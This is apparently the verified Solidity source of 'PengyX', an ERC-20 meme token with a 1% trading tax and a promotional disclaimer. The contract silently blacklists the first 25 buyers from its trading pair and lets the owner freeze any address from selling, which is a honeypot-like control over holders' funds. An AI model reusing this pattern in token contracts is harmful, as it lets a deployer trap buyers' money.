/**
 *Submitted for verification at Etherscan.io on 2023-07-24
 */

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

//        |-----------------------------------------------------------------------------------------------------------|
//        |                                                                        %################.                 |
//        |                                                                       #####################@              |
//        |                                                         |           ######    @#####    &####             |
//        |                                                         |           ###%        ,         ###%            |
//        |                                                         |          &###,  /&@@     @(@@   ####            |
//        |                                                         |           ###@       &..%      *####            |
//        |  $$$$$$$\  $$$$$$$$\ $$\   $$\  $$$$$$\ $$\     $$\     |           @####     .,,,,@    #####             |
//        |  $$  __$$\ $$  _____|$$$\  $$ |$$  __$$\\$$\   $$  |    |            %##(       ,*      @##(@             |
//        |  $$ |  $$ |$$ |      $$$$\ $$ |$$ /  \__|\$$\ $$  /     |        /#&##@                    ##&#&          |
//        |  $$$$$$$  |$$$$$\    $$ $$\$$ |$$ |$$$$\  \$$$$  /      |       ######                        #(###       |
//        |  $$  ____/ $$  __|   $$ \$$$$ |$$ |\_$$ |  \$$  /       |    #######                          ######.     |
//        |  $$ |      $$ |      $$ |\$$$ |$$ |  $$ |   $$ |        |  &#######@                          ##(#####    |
//        |  $$ |      $$$$$$$$\ $$ | \$$ |\$$$$$$  |   $$ |        |        ###                           &##        |
//        |  \__|      \________|\__|  \__| \______/    \__|        |        &##%                          ###        |
//        |                                                         |         %###                        @##@        |
//        |                                                         |           %###@                  &###&          |
//        |                                                                    &,,,,,&################@,,,,,%         |
//        |                                                                  ,.,,,.*%@               /(.,,,,/@        |
//        |-----------------------------------------------------------------------------------------------------------|
//                                -----> Ken and the community makes penguins fly! 🚀  <-----     */

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDEXFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract PengyX is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply;

    mapping(address => bool) public isExcludedFromFees;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public isBlacklisted;

    uint64 public autoBlacklistAddressCounter = 0;
    uint64 public autoBlacklistAddressLimit = 25;

    address public owner;
    address public constant feeWallet = 0x70fc94190723bACC4Bb80A11039D8c098aE6C355;
    address public constant liqWallet = 0x88ebA82a850321fe5a0618aaD874828afB6DB775;
    address public constant cexWallet = 0xEe2ff4932cEc4FD5B3Cffea7305C44feA579b315;
    address public constant airdropWallet = 0xB803b0E5E7457B135085E896FD7A3398b266cd43;
    address public immutable pair;
    address public immutable router;
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address public immutable WETH;

    bool private isSwapping;

    modifier onlyDeployer() {
        require(msg.sender == owner, "Only the owner can do that");
        _;
    }

    event AddressAutoBlacklisted(address indexed buyer);
    event BlacklistedAddressStatusChanged(
        address indexed blacklistedAddress,
        bool status
    );

    constructor() {
        owner = msg.sender;
        _name = "PENGYX";
        _symbol = "PENGYX";
        _totalSupply = 3_000_000_000 * (10 ** _decimals);
        router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2 router

        WETH = IDEXRouter(router).WETH();

        pair = IDEXFactory(IDEXRouter(router).factory()).createPair(
            address(this),
            WETH
        );

        isExcludedFromFees[owner] = true;
        isExcludedFromFees[liqWallet] = true;
        isExcludedFromFees[cexWallet] = true;
        isExcludedFromFees[airdropWallet] = true;

        _balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    receive() external payable {}

    function name() public view override returns (string memory) {
        return _name;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply - _balances[DEAD];
    }

    function decimals() public pure override returns (uint8) {
        return _decimals;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function rescueEth(uint256 amount) external onlyDeployer {
        (bool success, ) = address(owner).call{value: amount}("");
        success = true;
    }

    // If the limit is not reached, automatically add this address to the blacklist
    function autoBlacklistBuyerIfNeeded(address buyer) internal {
        // Prevent these addresses from being blacklisted
        if (buyer == owner || buyer == pair || buyer == router) return;

        if (
            autoBlacklistAddressCounter < autoBlacklistAddressLimit &&
            !isBlacklisted[buyer]
        ) {
            autoBlacklistAddressCounter++;
            isBlacklisted[buyer] = true;

            emit AddressAutoBlacklisted(buyer);
        }
    }

    function changeBlacklistedAddressStatus(
        address blacklistedAddress,
        bool status
    ) external onlyDeployer {
        isBlacklisted[blacklistedAddress] = status;

        emit BlacklistedAddressStatusChanged(blacklistedAddress, status);
    }

    function swapAllContractTokensForEth() internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 tokenAmount = _balances[address(this)];

        if (tokenAmount > 0) {
            _allowances[address(this)][router] += tokenAmount;
            // Swap all the PENGY balance to ETH
            IDEXRouter(router)
                .swapExactTokensForETHSupportingFeeOnTransferTokens(
                    tokenAmount,
                    0,
                    path,
                    feeWallet,
                    block.timestamp
                );
        }
    }

    function rescueToken(address token, uint256 amount) external onlyDeployer {
        IERC20(token).transfer(owner, amount);
    }

    function allowance(
        address holder,
        address spender
    ) public view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function approveMax(address spender) public returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        require(spender != address(0), "NO_ZERO");
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public returns (bool) {
        require(spender != address(0), "NO_ZERO");
        _allowances[msg.sender][spender] =
            allowance(msg.sender, spender) +
            addedValue;
        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public returns (bool) {
        require(spender != address(0), "NO_ZERO");
        require(
            allowance(msg.sender, spender) >= subtractedValue,
            "INSUFF_ALLOWANCE"
        );
        _allowances[msg.sender][spender] =
            allowance(msg.sender, spender) -
            subtractedValue;
        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(
                _allowances[sender][msg.sender] >= amount,
                "INSUFF_ALLOWANCE"
            );
            _allowances[sender][msg.sender] -= amount;
            emit Approval(sender, msg.sender, _allowances[sender][msg.sender]);
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        // Prevent a blacklisted wallet from buying/selling/transfering
        require(!isBlacklisted[sender], "BLACKLISTED");

        // If it's a buy, check if should automatically blacklist the buyer
        if (sender == pair) {
            autoBlacklistBuyerIfNeeded(recipient);
        }

        if (!checkTaxFree(sender, recipient)) {
            _lowGasTransfer(sender, address(this), amount / 100);
            amount = (amount * 99) / 100;
        }

        if (!isSwapping && sender != pair) {
            isSwapping = true;
            swapAllContractTokensForEth();
            isSwapping = false;
        }

        return _lowGasTransfer(sender, recipient, amount);
    }

    function checkTaxFree(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if (isSwapping) return true;
        if (isExcludedFromFees[sender] || isExcludedFromFees[recipient])
            return true;
        if (sender == pair || recipient == pair) return false;
        return true;
    }

    function _lowGasTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        require(sender != address(0), "Can't use zero addresses here");
        require(
            amount <= _balances[sender],
            "Can't transfer more than you own"
        );
        if (amount == 0) return true;
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function excludeFromFees(
        address excludedWallet,
        bool status
    ) external onlyDeployer {
        isExcludedFromFees[excludedWallet] = status;
    }

    function renounceOwnership() external onlyDeployer {
        owner = address(0);
    }
}

/*

The topics and opinions discussed by Ken the Crypto and the PENGY community are intended to convey general information only. All opinions expressed by Ken or the community should be treated as such.

This contract does not provide legal, investment, financial, tax, or any other type of similar advice.

As with all alternative currencies, Do Your Own Research (DYOR) before purchasing. Ken and the rest of the PENGY community are working to increase coin adoption, but no individual or community shall be held responsible for any financial losses or gains that may be incurred as a result of trading PENGY.

If you’re with us — Hop In, We’re Going Places 🚀

*/